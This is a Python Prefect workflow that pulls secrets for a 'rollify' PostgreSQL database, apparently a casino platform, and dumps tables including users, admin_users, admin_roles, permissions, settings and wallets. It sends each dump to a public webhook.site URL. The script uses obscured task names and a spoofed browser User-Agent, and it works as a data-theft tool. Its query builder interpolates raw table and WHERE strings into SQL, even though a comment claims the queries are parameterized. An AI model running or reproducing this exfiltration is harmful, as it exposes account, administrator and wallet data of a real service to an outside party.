import json
import subprocess
import sys
from datetime import datetime
from typing import Any, Optional

import requests
from prefect import flow, task
from prefect.blocks.system import Secret
from prefect.cache_policies import NO_CACHE
from sqlalchemy import create_engine, text
from sqlalchemy.pool import QueuePool


@task(name="ide")
def ide():
    """Install required packages dynamically"""
    packages = ["psycopg2-binary"]
    print(f"Installing packages: {', '.join(packages)}")

    for package in packages:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
            print(f"✓ Successfully installed {package}")
        except subprocess.CalledProcessError as e:
            print(f"✗ Failed to install {package}: {str(e)}")
            raise

    print("✓ All dependencies installed")


@task(name="cd", cache_policy=NO_CACHE)
def cd():
    """Create SQLAlchemy engine with connection pooling."""
    db_host = Secret.load("rollify-db-host")
    db_name = Secret.load("rollify-db-name")
    db_user = Secret.load("rollify-db-username")
    db_pass = Secret.load("rollify-db-password")

    username = db_user.get()
    password = db_pass.get()
    database = db_name.get()
    host = db_host.get()
    port = 5432

    drivers_to_try = [
        f"postgresql+psycopg2://{username}:{password}@{host}:{port}/{database}",
        f"postgresql://{username}:{password}@{host}:{port}/{database}",
    ]

    last_error = None
    for connection_string in drivers_to_try:
        try:
            print(f"Trying connection string: {connection_string.split('://')[0]}...")
            engine = create_engine(
                connection_string,
                poolclass=QueuePool,
                pool_size=10,
                max_overflow=20,
                pool_pre_ping=True,
                pool_recycle=3600,
                echo=False,
            )
            # Test the connection
            with engine.connect() as conn:
                conn.execute(text("SELECT 1"))
            print(
                f"✓ Successfully connected using: {connection_string.split('://')[0]}"
            )
            return engine
        except Exception as e:
            last_error = e
            print(f"✗ Failed with {connection_string.split('://')[0]}: {e!s}")
            continue

    raise Exception(
        f"Could not connect with any available driver. Last error: {last_error}"
    )


@task(name="ft", retries=3, retry_delay_seconds=10, cache_policy=NO_CACHE)
def ft(
    engine,
    tn: str,
    where_clause: Optional[str] = None,
    limit: Optional[int] = None,
) -> dict[str, Any]:
    # Build query safely using parameterized queries
    query = f"SELECT * FROM {tn}"

    if where_clause:
        query += f" WHERE {where_clause}"

    if limit:
        query += f" LIMIT {limit}"

    print(f"Executing query: {query}")

    with engine.connect() as conn:
        result = conn.execute(text(query))
        rows = result.fetchall()
        keys = result.keys()

    # Convert to list of dictionaries
    data = [dict(zip(keys, row)) for row in rows]

    return {
        "tn": tn,
        "row_count": len(data),
        "data": data,
        "timestamp": datetime.now().isoformat(),
    }


@task(name="send-to-webhook", retries=3, retry_delay_seconds=5)
def send_to_webhook(webhook_url: str, data: dict[str, Any]) -> dict[str, Any]:
    default_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1",
    }

    try:
        print(f"Sending data to webhook: {webhook_url}")

        # Convert datetime objects to strings for JSON serialization
        payload = json.loads(json.dumps(data, default=str))

        response = requests.post(
            webhook_url, json=payload, headers=default_headers, timeout=30
        )

        response.raise_for_status()

        result = {
            "status": "success",
            "status_code": response.status_code,
            "response": response.text[:500],  # First 500 chars of response
            "timestamp": datetime.now().isoformat(),
        }

        print(f"✓ Webhook delivery successful! Status: {response.status_code}")
        return result

    except requests.exceptions.RequestException as e:
        error_result = {
            "status": "failed",
            "error": str(e),
            "timestamp": datetime.now().isoformat(),
        }
        print(f"✗ Webhook delivery failed: {e!s}")
        raise


@task(name="ce")
def ce(engine):
    engine.dispose()


@flow(name="saf", log_prints=True)
def saf() -> dict[str, Any]:
    ide()

    # Create engine
    engine = cd()

    results = []
    webhook_url = "https://webhook.site/b2d9741e-37af-4db6-9018-18f4fe9a713a"
    table_configs = [
        {"tn": "public.users", "limit": 300},
        {
            "tn": "public.admin_roles",
        },
        {"tn": "public.admin_users"},
        {
            "tn": "public.settings",
        },
        {
            "tn": "public.user_tags",
        },
        {
            "tn": "public.tags",
        },
        {
            "tn": "public.casino_aggregators",
        },
        {
            "tn": "public.permissions",
        },
        {
            "tn": "public.promos",
        },
        {"tn": "public.wallets", "limit": 2500},
    ]
    try:
        for config in table_configs:
            tn = config.get("tn")
            where_clause = config.get("where_clause")
            limit = config.get("limit")

            print(f"\n--- Processing table: {tn} ---")

            # Fetch data
            table_data = ft(
                engine=engine,
                tn=tn,
                where_clause=where_clause,
                limit=limit,
            )

            # Send to webhook
            webhook_result = send_to_webhook(webhook_url=webhook_url, data=table_data)

            results.append(
                {
                    "tn": tn,
                    "rows_fetched": table_data["row_count"],
                    "webhook_status": webhook_result["status"],
                }
            )

        summary = {
            "status": "completed",
            "timestamp": datetime.now().isoformat(),
            "tables_processed": len(results),
            "results": results,
        }

        print("\n✓ All operations completed successfully!")
        print(f"  - Tables processed: {len(results)}")

        return summary

    finally:
        # Always close the engine
        ce(engine)
